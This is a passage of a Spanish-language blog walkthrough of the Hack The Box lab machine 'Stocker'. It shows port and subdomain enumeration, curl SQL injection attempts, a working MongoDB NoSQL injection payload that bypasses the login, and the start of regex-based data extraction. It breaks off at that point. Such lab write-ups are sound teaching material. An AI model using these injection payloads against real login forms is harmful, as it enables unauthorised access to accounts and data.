<!doctype html><html lang="es"><head><title>Stocker | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. M√°quina f√°cil. Esta m√°quina tiene una p√°gina web vulnerable a inyecci√≥n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci√≥n. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el c√≥digo fuente. Despu√©s encontramos una contrase√±a en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar scripts en Node.js con sudo en una ruta que tiene un wildcard. Para escalar privilegios hay que abusar de este wildcard"><meta name="image" content="https://7rocky.github.io/images/HTB/Stocker/Stocker.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. M√°quina f√°cil. Esta m√°quina tiene una p√°gina web vulnerable a inyecci√≥n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci√≥n. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el c√≥digo fuente. Despu√©s encontramos una contrase√±a en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar scripts en Node.js con sudo en una ruta que tiene un wildcard. Para escalar privilegios hay que abusar de este wildcard"><meta itemprop="keywords" content="sudo,wildcard,mongodb,express,nosqli,xss,metadata,directory-path-traversal,lfr,password-reuse,"><meta itemprop="name" content="Stocker"><meta property="article:published_time" content="2023-06-24T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. M√°quina f√°cil. Esta m√°quina tiene una p√°gina web vulnerable a inyecci√≥n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci√≥n. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el c√≥digo fuente. Despu√©s encontramos una contrase√±a en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar scripts en Node.js con sudo en una ruta que tiene un wildcard. Para escalar privilegios hay que abusar de este wildcard"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Stocker/Stocker.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Stocker"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/stocker/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. M√°quina f√°cil. Esta m√°quina tiene una p√°gina web vulnerable a inyecci√≥n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci√≥n. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el c√≥digo fuente. Despu√©s encontramos una contrase√±a en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar scripts en Node.js con sudo en una ruta que tiene un wildcard. Para escalar privilegios hay que abusar de este wildcard"><meta name="twitter:description" content="Hack The Box. Linux. M√°quina f√°cil. Esta m√°quina tiene una p√°gina web vulnerable a inyecci√≥n NoSQL. Mediante esta vulnerabilidad, podemos saltarnos la autenticaci√≥n. Luego, tenemos una funcionalidad para convertir un texto HTML en PDF, siendo capaces de realizar un ataque XSS del lado servidor para leer archivos del servidor, como el c√≥digo fuente. Despu√©s encontramos una contrase√±a en texto claro que se reutiliza en SSH. Finalmente, un usuario puede ejecutar scripts en Node.js con sudo en una ruta que tiene un wildcard. Para escalar privilegios hay que abusar de este wildcard"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Stocker/Stocker.webp"><meta name="twitter:title" content="Stocker"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/stocker/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/stocker/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/stocker/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/stocker/&amp;text=Stocker" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/stocker/&amp;title=Stocker" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Stocker</h1><time class="mt4 f6 dib tracked" datetime="2023-06-24T00:00:00+01:00">24 / 06 / 2023</time><br><p class="mb4 f6 dib tracked">8 minutos de lectura</p></header><div class="htb-image"><img alt="Stocker" src="/images/HTB/Stocker/Stocker.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/wildcard" title="<em>Wildcard</em>"><em>Wildcard</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/mongodb" title="MongoDB">MongoDB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/express" title="Express JS">Express JS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/nosqli" title="Inyecci√≥n NoSQL">Inyecci√≥n NoSQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/xss" title="<em>Cross-Site Scripting</em>"><em>Cross-Site Scripting</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/metadata" title="Metadatos de archivos">Metadatos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegaci√≥n de directorios">Navegaci√≥n de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/lfr" title="Lectura de Archivos Locales">Lectura de Archivos Locales</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilizaci√≥n de contrase√±as">Reutilizaci√≥n de contrase√±as</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#encontrando-una-inyecci√≥n-nosql">Encontrando una inyecci√≥n NoSQL</a></li><li><a href="#extrayendo-valores-mediante-nosqli">Extrayendo valores mediante NoSQLi</a></li><li><a href="#funcionalidad-de-exportar-a-pdf">Funcionalidad de exportar a PDF</a></li></ul></li><li><a href="#acceso-a-la-m√°quina">Acceso a la m√°quina</a></li><li><a href="#enumeraci√≥n-del-sistema">Enumeraci√≥n del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: F√°cil</li><li><strong>Direcci√≥n IP</strong>: 10.10.11.196</li><li><strong>Fecha</strong>: 14 / 01 / 2023</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.196 -p 22,80
Nmap scan report for 10.10.11.196
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Stockers Sign-in
|_Requested resource was /login
|_http-generator: Hugo 0.84.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 9.49 seconds
</code></pre></div><p>La m√°quina tiene abietos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeration">Enumeration</h2><p>Si vamos a <code>http://10.10.11.196</code>, se nos redirige a <code>http://stocker.htb</code>. Despu√©s de poner el dominio en <code>/etc/hosts</code>, vemos esta p√°gina:</p><p><img alt="Stocker 1" src="/images/HTB/Stocker/Stocker-1.webp"></p><p>Parece ser un sitio web est√°tico. Enumeremos m√°s rutas usando <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://stocker.htb/FUZZ
<span class="code-dark-blue">img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 88ms]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 49ms]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 49ms]</span>
<span class="code-dark-blue">fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 67ms]</span>
<span class="code-dark-green">                        [Status: 200, Size: 15463, Words: 4199, Lines: 322, Duration: 50ms]</span>  
</code></pre></div><p>Nada parece ser √∫til. Al final de la p√°gina, tenemos un nombre de usuario (Angoose Garden):</p><p><img alt="Stocker 2" src="/images/HTB/Stocker/Stocker-2.webp"></p><p>Veamos si hay m√°s subdominios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.196 -H <span class="code-dark-yellow">'Host: FUZZ.stocker.htb'</span> -fs 169  
<span class="code-dark-green">dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 128ms]</span>
</code></pre></div><p>Genial, ahora podemos a√±ador <code>dev.stocker.htb</code> en <code>/etc/hosts</code> y acceder a la siguiente p√°gina web:</p><p><img alt="Stocker 3" src="/images/HTB/Stocker/Stocker-3.webp"></p><p>Nuevamente, vamos a aplicar <em>fuzzing</em> para enumerar m√°s rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://dev.stocker.htb/FUZZ  
<span class="code-dark-green">login                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 249ms]</span>
<span class="code-dark-blue">static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 124ms]</span>
<span class="code-dark-green">Login                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 166ms]</span>
<span class="code-dark-blue">logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 113ms]</span>
<span class="code-dark-blue">stock                   [Status: 302, Size: 48, Words: 4, Lines: 1, Duration: 83ms]</span>
<span class="code-dark-blue">Logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 159ms]</span>
<span class="code-dark-blue">Static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 132ms]</span>
<span class="code-dark-blue">                        [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 90ms]</span>
<span class="code-dark-green">LogIn                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 126ms]</span>
<span class="code-dark-green">LOGIN                   [Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 75ms]</span>
</code></pre></div><p>No hay mucho m√°s que ver. Por otro lado, podemos analizar las cabeceras de respuesta HTTP y descubrir que <code>dev.stocker.htb</code> usa Express JS (Node.js):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -I stocker.htb
HTTP/1.1 200 OK
<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/html
<span class="code-white">Content-Length</span>: 15463
<span class="code-white">Last-Modified</span>: Wed, 21 Dec 2022 18:31:13 GMT
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">ETag</span>: "63a350f1-3c67"
<span class="code-white">Accept-Ranges</span>: bytes

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -I dev.stocker.htb
HTTP/1.1 302 Found
<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/plain; charset=utf-8
<span class="code-white">Content-Length</span>: 28
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">X-Powered-By</span>: Express
<span class="code-white">Location</span>: /login
<span class="code-white">Vary</span>: Accept
<span class="code-white">Set-Cookie</span>: connect.sid=s%3AK2nNo-lKYxsV_Wwi8C2jJUGNReotOxyZ.dJsRk%2FOd%2FkCJ0AxOJtDYj1eeWT45f1MzLkdFagh%2FpcE; Path=/; HttpOnly  
</code></pre></div><p>Adem√°s, tenemos una <em>cookie</em> extra√±a llamada <code>connect.sid</code>.</p><h3 id="encontrando-una-inyecci√≥n-nosql">Encontrando una inyecci√≥n NoSQL</h3><p>Dado que no hay nada m√°s para enumerar, todo lo que tenemos es el formulario de inicio de sesi√≥n. Podemos probar algunos <em>payloads</em> de inyecci√≥n de c√≥digo SQL, pero ninguno de ellos funciona (no hay errores ni evidencias):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">"username='&password=asdf"</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">"username='+or+1=1--+-&password=asdf"</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">"username='+or+sleep(10)--+-&password=asdf"</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">$'{"username":"<span class="code-dark-cyan">\'</span>","password":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">$'{"username":"<span class="code-dark-cyan">\'</span> or 1=1-- -","password":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">$'{"username":"<span class="code-dark-cyan">\'</span> or sleep(10)-- -","password":"asdf"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
Found. Redirecting to /login?error=login-error
</code></pre></div><p>En este punto, podemos deducir que el servidor usa MongoDB (porque es muy apropiado para los proyectos de Node.js), que es un administrador de bases de datos NoSQL. Por lo tanto, probemos algunos <em>payloads</em> de <a target="_blank" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadsAllTheThings</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">'username[$ne]=toto&password[$ne]=toto'</span>
Found. Redirecting to /login?error=login-error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -d <span class="code-dark-yellow">$'{"username":{"$ne":"foo"},"password":{"$ne":"bar"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
Found. Redirecting to /stock
</code></pre></div><p>¬°Ah√≠ lo tenemos! Usando el <em>payload</em> en JSON, podemos saltarnos la autenticaci√≥n. Para ver <code>/stock</code> en el navegador, podemos coger la cookie <code>connect.sid</code> de la respuesta y ponerla en el navegador:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.stocker.htb/login -id <span class="code-dark-yellow">$'{"username":{"$ne":"toto"},"password":{"$ne":"toto"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
HTTP/1.1 302 Found
<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
<span class="code-white">Date</span>: Wed, 18 Jan 2023 23:11:22 GMT
<span class="code-white">Content-Type</span>: text/plain; charset=utf-8
<span class="code-white">Content-Length</span>: 28
<span class="code-white">Connection</span>: keep-alive
<span class="code-white">X-Powered-By</span>: Express
<span class="code-white">Location</span>: /stock
<span class="code-white">Vary</span>: Accept
<span class="code-white">Set-Cookie</span>: connect.sid=s%3AyepLh_Cn7RnHLC9QRnQPqJpON0CWbThV.Nkdi0tXEKTMMrDv2pxEaSSl7tGfTzwDOeLQ58rCo9%2FU; Path=/; HttpOnly

Found. Redirecting to /stock
</code></pre></div><p><img alt="Stock 4" src="/images/HTB/Stocker/Stocker-4.webp"></p><p><img alt="Stock 5" src="/images/HTB/Stocker/Stocker-5.webp"></p><p>Parece una aplicaci√≥n web para comprar cosas raras. Podemos pinchar en algunos art√≠culos y se agregar√°n al carrito.</p><h3 id="extrayendo-valores-mediante-nosqli">Extrayendo valores mediante NoSQLi</h3><p>Antes de analizar la nueva p√°gina web, vamos a extraer valores de la base de datos utilizando RegEx. La idea es poner algo como:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk7 mtki">"username"</span><span class="mtk1">: {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"$regex"</span><span class="mtk1">: </span><span class="mtk11">"^x.*"</span>  
<span class="mtk1">  },</span>
<span class="mtk1">  </span><span class="mtk7 mtki">"password"</span><span class="mtk1">: {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">"$ne"</span><span class="mtk1">: </span><span class="mtk11">"bar"</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
